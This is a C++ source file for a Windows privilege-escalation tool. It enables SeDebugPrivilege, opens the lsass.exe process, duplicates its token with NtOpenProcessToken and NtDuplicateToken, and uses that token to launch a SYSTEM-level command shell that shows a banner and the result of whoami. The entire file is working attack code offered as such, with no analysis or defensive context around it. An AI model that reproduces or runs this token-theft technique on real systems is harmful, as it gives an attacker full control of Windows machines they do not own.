#include <windows.h>  
#include <ntstatus.h> 
#include <winternl.h> 
#include <tlhelp32.h> 
#include <sddl.h>     
#include <iostream>   
#include <string>     

////////////////////////////////////////////////////////////////////////////////////////////////////
typedef NTSTATUS(NTAPI* NtDuplicateToken)(
    HANDLE ExistingTokenHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    BOOLEAN EffectiveOnly,
    TOKEN_TYPE TokenType,
    PHANDLE NewTokenHandle
    );

typedef NTSTATUS(NTAPI* NtOpenProcessToken)(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PHANDLE TokenHandle
    );
////////////////////////////////////////////////////////////////////////////////////////////////////

int main() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) {
        std::cerr << "[x] Failed to load ntdll.dll\n[x] error :  " << GetLastError() << std::endl;
        return 1;
    }

    NtDuplicateToken ntDuplicateToken = (NtDuplicateToken)GetProcAddress(ntdll, "NtDuplicateToken");
    NtOpenProcessToken ntOpenProcessToken = (NtOpenProcessToken)GetProcAddress(ntdll, "NtOpenProcessToken");
    if (!ntDuplicateToken || !ntOpenProcessToken) {
        std::cerr << "[x] Failed to get Nt function pointers\n[x] error :  " << GetLastError() << std::endl;
        FreeLibrary(ntdll);
        return 1;
    }

    HANDLE currentToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken)) {
        std::cerr << "[x] OpenProcessToken failed\n[x] error :  " << GetLastError() << std::endl;
        FreeLibrary(ntdll);
        return 1;
    }

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "[x] LookupPrivilegeValue failed\n[x] error :  " << GetLastError() << std::endl;
        CloseHandle(currentToken);
        FreeLibrary(ntdll);
        return 1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        std::cerr << "[x] AdjustTokenPrivileges failed\n[x] error :  " << GetLastError() << std::endl;
        CloseHandle(currentToken);
        FreeLibrary(ntdll);
        return 1;
    }
    CloseHandle(currentToken);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "[x] CreateToolhelp32Snapshot failed\n[x] error :  " << GetLastError() << std::endl;
        FreeLibrary(ntdll);
        return 1;
    }

    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    HANDLE lsassHandle = NULL;
    if (Process32First(snapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0) {
                lsassHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (lsassHandle) break;
            }
        } while (Process32Next(snapshot, &pe32));
    }
    CloseHandle(snapshot);

    if (!lsassHandle) {
        std::cerr << "[x] Failed to open lsass.exe \n[x] error :  " << GetLastError() << std::endl;
        FreeLibrary(ntdll);
        return 1;
    }

    HANDLE lsassToken;
    NTSTATUS status = ntOpenProcessToken(lsassHandle, TOKEN_DUPLICATE, &lsassToken);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[x] NtOpenProcessToken failed \n[x] error : 0x" << std::hex << status << std::endl;
        CloseHandle(lsassHandle);
        FreeLibrary(ntdll);
        return 1;
    }

    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    HANDLE newToken;
    status = ntDuplicateToken(lsassToken, TOKEN_ALL_ACCESS, &oa, FALSE, TokenPrimary, &newToken);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[x] NtDuplicateToken failed\n[x] error :  0x" << std::hex << status << std::endl;
        CloseHandle(lsassToken);
        CloseHandle(lsassHandle);
        FreeLibrary(ntdll);
        return 1;
    }

    CloseHandle(lsassToken);
    CloseHandle(lsassHandle);

    std::wstring asciiArt = L""
        L" __  __     __     __     __  __     \n"
        L"/\\ \\/\\ \\   /\\ \\  _ \\ \\   /\\ \\/\\ \\    \n"
        L"\\ \\ \\_\\ \\  \\ \\ \\/. \"\\ \\  \\ \\ \\_\\ \\   \n"
        L" \\ \\_____\\  \\ \\_\\/\\.~\\_\\  \\ \\_____\\  \n"
        L"  \\/_____/   \\/_/   \\/_/   \\/_____/  \n"
        L"                                    \n"
        L"current perm > ";

    HANDLE asciiFile = CreateFileW(L"C:\\Windows\\Temp\\ascii.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (asciiFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(asciiFile, asciiArt.c_str(), asciiArt.size() * sizeof(wchar_t), &written, NULL);
        CloseHandle(asciiFile);
    }

    std::wstring cmd = L"cmd.exe /c type C:\\Windows\\Temp\\ascii.txt & powershell -Command \"$output = whoami; Write-Host $output -ForegroundColor Red; Write-Host ''\" & cmd";

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessWithTokenW(newToken, LOGON_WITH_PROFILE, NULL, const_cast<wchar_t*>(cmd.c_str()), CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        std::cerr << "[x] CreateProcessWithTokenW failed " << GetLastError() << std::endl;
        CloseHandle(newToken);
        FreeLibrary(ntdll);
        return 1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(newToken);
    FreeLibrary(ntdll);

    return 0;
}